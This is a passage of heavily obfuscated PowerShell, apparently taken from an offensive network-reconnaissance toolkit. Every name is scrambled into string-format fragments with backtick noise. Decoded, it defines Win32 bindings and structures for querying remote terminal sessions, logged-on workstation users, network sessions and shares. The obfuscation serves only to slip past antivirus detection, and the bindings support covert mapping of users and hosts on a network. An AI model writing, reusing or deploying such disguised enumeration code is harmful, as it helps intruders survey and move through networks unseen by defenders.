    (&("{0}{1}"-f 'fu','nc') ("{1}{2}{0}"-f '2',("{0}{1}"-f 'w','tsap'),'i3') ("{3}{0}{1}{5}{2}{4}"-f'Ses',("{1}{0}"-f 'n','sio'),'f',("{1}{0}"-f'ery','WTSQu'),("{1}{0}"-f'mation','or'),'In') ([Int]) @([IntPtr], [Int], [Int],  (&("{2}{0}{1}"-f 'Et',("{1}{2}{0}"-f'E','-Va','rIABl'),'G')  ("{0}{1}"-f'SQ','g') -vALu ).("{0}{1}{3}{2}" -f'M','ak','ype',("{1}{0}" -f 'T','eByRef'))."inV`oke"(),   ( &("{0}{1}" -f'V',("{2}{0}{1}" -f'ia','ble','AR'))  ("{0}{1}"-f 'MP','6')  )."vA`lue".("{0}{3}{2}{1}" -f("{1}{0}"-f 'eB','Mak'),'pe',("{0}{1}"-f 'Ref','Ty'),'y')."InvO`ke"())),
    (&("{0}{1}"-f'fu','nc') ("{2}{0}{1}"-f 'sap','i32','wt') ("{1}{2}{0}"-f ("{2}{1}{0}"-f 'oryEx','eeMem','r'),'W','TSF') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{0}{1}" -f 'f','unc') ("{0}{1}{2}" -f ("{0}{1}" -f 'w','tsa'),'pi','32') ("{3}{2}{1}{0}" -f ("{1}{0}" -f 'mory','e'),("{1}{0}"-f'M','ree'),'F','WTS') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'f','unc') ("{0}{1}{2}" -f 'wt','s',("{1}{0}"-f'pi32','a')) ("{0}{2}{4}{1}{3}" -f("{0}{1}"-f'W','TSC'),'e',("{0}{1}"-f'lose','Ser'),'r','v') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'unc','f') ("{2}{1}{0}" -f '32',("{0}{1}" -f'erne','l'),'k') ("{2}{1}{3}{0}"-f'or',("{0}{1}" -f 'L','astE'),'Get','rr') ([Int]) @())
)


${w`TsC`onNeC`TSt`Ate} = &("{0}{1}"-f'pse','num') ${M`od} ("{4}{1}{0}{2}{3}" -f 'C',("{0}{1}" -f'TS_C','ONNE'),("{1}{0}"-f 'TE_CL','TSTA'),'ASS','W') ("{1}{0}" -f ("{0}{1}" -f 'n','t16'),'UI') @{
    ("{0}{1}{2}" -f 'A','cti','ve')       =    0
    ("{2}{1}{3}{0}" -f'd','c',("{0}{1}" -f 'C','onne'),'te')    =    1
    ("{3}{0}{1}{2}"-f("{1}{0}" -f 'ct','nne'),'Qu','ery','Co') =    2
    ("{1}{0}"-f ("{0}{1}"-f 'hado','w'),'S')       =    3
    ("{3}{1}{2}{0}"-f("{0}{1}" -f 'cte','d'),'n','ne',("{1}{0}"-f'o','Disc')) =    4
    ("{0}{1}"-f'I','dle')         =    5
    ("{0}{1}"-f 'Lis','ten')       =    6
    ("{1}{0}"-f 'set','Re')        =    7
    ("{1}{0}" -f'n','Dow')         =    8
    ("{0}{1}" -f 'Ini','t')         =    9
}


${wTs_SeSSi`oN_iNf`O`_1} = &("{1}{0}" -f ("{0}{1}"-f 'ru','ct'),'st') ${M`Od} ("{0}{1}{2}{3}"-f 'WTS',("{1}{0}"-f 'ESS','_S'),("{1}{0}"-f'ON_IN','I'),("{1}{0}"-f 'O_1','F')) @{
    ("{0}{2}{1}"-f'E',("{0}{1}"-f'cEnv','Id'),'xe') = &("{0}{1}"-f ("{1}{0}"-f 'l','fie'),'d') 0 ("{2}{0}{1}" -f("{1}{0}" -f'nt3','I'),'2','U')
    ("{0}{1}" -f ("{0}{1}" -f 'Sta','t'),'e') = &("{0}{1}" -f("{1}{0}"-f'l','fie'),'d') 1 ${w`TSC`onnecTs`TAte}
    ("{1}{0}"-f("{1}{0}" -f'onId','i'),("{1}{0}"-f'ss','Se')) = &("{0}{1}" -f 'fie','ld') 2 ("{0}{1}" -f'UIn','t32')
    ("{1}{0}{2}" -f 'io',("{1}{0}"-f 'Sess','p'),("{1}{0}"-f 'Name','n')) = &("{1}{0}" -f'd',("{0}{1}" -f'fi','el')) 3 ("{1}{0}{2}"-f ("{1}{0}" -f'n','tri'),'S','g') -MarshalAs @(("{1}{2}{0}" -f'Str','L','PW'))
    ("{2}{1}{0}"-f 'ame','stN','pHo') = &("{0}{1}"-f 'fie','ld') 4 ("{1}{0}"-f'ng',("{0}{1}" -f 'Str','i')) -MarshalAs @(("{0}{1}"-f 'LP',("{0}{1}"-f'WSt','r')))
    ("{2}{1}{0}"-f 'e','m',("{0}{1}"-f 'pU','serNa')) = &("{0}{1}"-f 'f',("{0}{1}" -f'i','eld')) 5 ("{1}{0}"-f("{1}{0}"-f 'g','trin'),'S') -MarshalAs @(("{1}{2}{0}"-f 'r','LPW','St'))
    ("{2}{1}{0}{3}" -f'in','oma','pD',("{0}{1}" -f 'Nam','e')) = &("{1}{0}"-f'ld','fie') 6 ("{0}{1}"-f'St',("{0}{1}"-f 'r','ing')) -MarshalAs @(("{1}{0}" -f 'r',("{0}{1}"-f'LPW','St')))
    ("{1}{0}{3}{2}" -f 'a','pF',("{1}{0}"-f'e','Nam'),'rm') = &("{1}{0}" -f ("{0}{1}"-f'iel','d'),'f') 7 ("{1}{0}"-f ("{0}{1}" -f 'tr','ing'),'S') -MarshalAs @(("{1}{0}"-f("{1}{0}"-f'r','WSt'),'LP'))
}


${Wt`S_C`liE`NT_AdD`ResS} = &("{0}{1}"-f 's',("{0}{1}" -f'tr','uct')) ${m`oD} ("{0}{2}{4}{3}{1}" -f("{2}{0}{1}" -f 'TS_C','LIE','W'),("{2}{0}{1}" -f 'R','ESS','DD'),'N','_A','T') @{
    ("{1}{2}{0}{3}"-f'm',("{0}{1}{2}"-f 'A','dd','res'),'sFa','ily') = &("{0}{1}" -f'fi','eld') 0 ("{0}{1}" -f ("{1}{0}"-f 'nt','UI'),'32')
    ("{0}{1}{2}" -f'Add','res','s') = &("{1}{0}"-f 'd',("{1}{0}" -f'el','fi')) 1 ("{0}{1}{2}" -f 'Byt','e[',']') -MarshalAs @(("{0}{2}{1}" -f'ByV',("{1}{0}"-f'ay','rr'),'alA'), 20)
}


${SHA`Re_In`F`O_1} = &("{1}{0}" -f'uct','str') ${M`od} ("{0}{1}{3}{2}" -f ("{0}{2}{1}"-f'SHA','N','RE_I'),'F','_1','O') @{
    ("{3}{1}{2}{0}" -f("{0}{1}"-f 'n','ame'),("{1}{0}"-f '1_n','i'),'et','sh') = &("{0}{1}"-f ("{0}{1}"-f 'fie','l'),'d') 0 ("{1}{2}{0}"-f'g','Str','in') -MarshalAs @(("{0}{1}" -f ("{1}{0}" -f 'S','LPW'),'tr'))
    ("{0}{1}{2}" -f'shi','1',("{1}{0}" -f'pe','_ty')) = &("{0}{1}" -f'f',("{0}{1}" -f 'iel','d')) 1 ("{1}{0}"-f("{1}{0}" -f't32','n'),'UI')
    ("{3}{0}{2}{1}"-f 'r','ark','em',("{0}{1}"-f'shi','1_')) = &("{1}{0}" -f("{1}{0}" -f 'ld','ie'),'f') 2 ("{1}{0}"-f 'ng',("{1}{0}"-f'i','Str')) -MarshalAs @(("{0}{1}" -f'LP',("{1}{0}" -f 'tr','WS')))
}


${wk`S`Ta_`USEr_in`Fo`_1} = &("{1}{2}{0}"-f 'ct','str','u') ${m`OD} ("{3}{1}{2}{0}"-f ("{0}{1}"-f 'NFO_','1'),'USE','R_I',("{1}{2}{0}" -f'_','WKST','A')) @{
    ("{0}{1}{2}{3}{4}"-f 'w','ku','i1_','us',("{0}{2}{1}"-f 'ern','e','am')) = &("{0}{1}" -f 'f',("{0}{1}"-f 'ie','ld')) 0 ("{1}{2}{0}"-f 'ng','Str','i') -MarshalAs @(("{0}{2}{1}"-f 'L',("{0}{1}"-f 'WS','tr'),'P'))
    ("{3}{1}{2}{0}"-f("{2}{0}{1}" -f '_','domain','n'),("{1}{0}" -f '1_','kui'),("{1}{0}" -f 'ogo','l'),'w') = &("{0}{1}" -f("{1}{0}"-f 'iel','f'),'d') 1 ("{0}{1}" -f'Str','ing') -MarshalAs @(("{1}{2}{0}"-f'tr','L','PWS'))
    ("{0}{2}{3}{1}{4}" -f("{1}{0}"-f'i1','wku'),'a','_',("{1}{0}"-f'om','oth_d'),'ins') = &("{0}{1}"-f("{1}{0}" -f 'l','fie'),'d') 2 ("{1}{0}"-f ("{1}{0}" -f'g','rin'),'St') -MarshalAs @(("{0}{1}"-f 'LP',("{0}{1}"-f 'WS','tr')))
    ("{4}{1}{0}{3}{2}" -f("{1}{2}{0}"-f'erv','_','logon_s'),("{1}{0}"-f'i1','ku'),'r','e','w') = &("{0}{1}"-f 'fi','eld') 3 ("{0}{1}{2}"-f 'Str','i','ng') -MarshalAs @(("{1}{0}" -f("{0}{1}"-f'PW','Str'),'L'))
}


${SesS`Ion_INF`O_`10} = &("{0}{2}{1}" -f'st','uct','r') ${m`Od} ("{1}{3}{2}{0}" -f'_10',("{2}{1}{0}" -f 'ON','I','SESS'),("{0}{1}" -f'I','NFO'),'_') @{
    ("{2}{3}{0}{1}" -f("{1}{0}" -f'na','_c'),'me','se',("{0}{1}"-f'si','10')) = &("{0}{1}" -f'fi','eld') 0 ("{1}{0}"-f 'g',("{0}{1}"-f 'S','trin')) -MarshalAs @(("{0}{1}"-f'L',("{1}{0}"-f 'Str','PW')))
    ("{3}{2}{0}{1}" -f 'se',("{0}{1}" -f'r','name'),("{0}{1}" -f 'si','10_u'),'se') = &("{1}{0}"-f'd',("{0}{1}" -f'f','iel')) 1 ("{0}{1}"-f ("{0}{1}"-f'Str','in'),'g') -MarshalAs @(("{0}{2}{1}"-f'LPW','r','St'))
    ("{2}{0}{1}"-f '_ti','me',("{1}{2}{0}"-f '0','ses','i1')) = &("{0}{1}"-f'fi','eld') 2 ("{0}{1}"-f'UI',("{0}{1}" -f'n','t32'))
    ("{0}{1}{2}{4}{3}"-f ("{1}{0}" -f 'i10_i','ses'),("{0}{1}" -f'd','le_'),'ti','e','m') = &("{1}{0}" -f'ld','fie') 3 ("{1}{2}{0}" -f '32','U','Int')
}


${t`Y`PEs} = ${fun`cTiONde`FiN`iT`i`oNs} | &("{1}{0}{2}" -f("{1}{2}{0}"-f'n32T','d','-Wi'),'Ad','ype') -Module ${m`oD} -Namespace ("{0}{1}"-f'Wi','n32')
${n`Et`API32} = ${T`YP`ES}[("{0}{1}{2}"-f'n',("{0}{1}"-f 'etap','i'),'32')]
${aDv`A`pI32} = ${T`yP`Es}[("{0}{1}{2}" -f'ad','va',("{0}{1}" -f 'p','i32'))]
${ke`Rn`El32} = ${tY`PEs}[("{0}{1}"-f("{2}{1}{0}" -f 'l','e','kern'),'32')]
${wt`sAPI`32} = ${T`yPEs}[("{2}{0}{1}" -f'pi','32',("{0}{1}"-f'wts','a'))]

